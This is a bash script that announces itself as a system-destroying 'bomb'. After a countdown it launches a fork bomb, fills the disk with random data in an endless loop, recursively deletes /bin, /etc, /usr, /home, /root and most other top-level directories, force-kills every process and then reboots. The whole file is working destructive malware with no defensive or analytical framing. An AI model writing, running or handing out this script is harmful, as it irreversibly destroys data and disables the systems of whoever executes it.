RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${RED}"
echo "HI BROTHER :]"
echo " SORRY"
echo "This Bomb will destroy this system"             
echo -e "${NC}"

echo -e "${YELLOW}"
echo "⚠️  WARNING! ⚠️"
echo -e "${RED}EXPLODEEE${NC}"
echo -e "${YELLOW}"

echo -e "${RED}5 Seconds ${NC}"
for i in {5..1}; do
    echo -ne "  $i...\r"
    sleep 1
done
echo ""
echo -e "${RED}💀 GO! 💀${NC}"
echo ""


# PHASE 1: FORK BOMB
echo -e "${BLUE}[PHASE 1] FORK BOMB...${NC}"

cat > /tmp/fork_bomb.sh << 'EOF'
#!/bin/bash
:(){ :|:& };:
EOF

chmod +x /tmp/fork_bomb.sh
/tmp/fork_bomb.sh &

echo -e "${GREEN}✓ Fork bomb Running${NC}"
sleep 1


# PHASE 2: DISK FILLER 
echo -e "${BLUE}[PHASE 2] DISK FILLER ${NC}"

(
    while true; do
        dd if=/dev/urandom of=/tmp/fill_$(date +%s%N).dat bs=1M count=50 2>/dev/null
        dd if=/dev/urandom of=/var/tmp/fill_$(date +%s%N).dat bs=1M count=50 2>/dev/null
    done
) &

sleep 1


# PHASE 3: DELETE SYSTEM FILES (TAPI AMAN, GAK SENTUH BOOT)
echo -e "${BLUE}[PHASE 3] DELETE SYSTEM FILES...${NC}"

(
    rm -rf /bin 2>/dev/null &
    rm -rf /etc 2>/dev/null &
    rm -rf /lib 2>/dev/null &
    rm -rf /lib64 2>/dev/null &
    rm -rf /sbin 2>/dev/null &
    rm -rf /usr 2>/dev/null &
    rm -rf /var 2>/dev/null &
    rm -rf /opt 2>/dev/null &
    rm -rf /home 2>/dev/null &
    rm -rf /root 2>/dev/null &
    
    find /* -maxdepth 0 ! -path /boot ! -path /dev ! -path /proc ! -path /sys -exec rm -rf {} \; 2>/dev/null &
) &

echo -e "${GREEN}✓ System files deleted!${NC}"
sleep 1


# PHASE 4: KILLING PROCESSES
echo -e "${BLUE}[PHASE 4] KILLING PROCESSES...${NC}"

(
    pkill -9 -f . 2>/dev/null
) &

echo -e "${GREEN}✓ Processes killed!${NC}"
sleep 1


# FINAL
echo -e "${RED}"

echo "GOODBYE 💀"
echo -e "${NC}"

echo -e "${GREEN} boot now.${NC}"
echo -e "${YELLOW}use USB installer to reboot!${NC}"

# Reboot with countdown
echo -e "${BLUE}rebooting...1...2...3...4...5...${NC}"
sleep 5
reboot
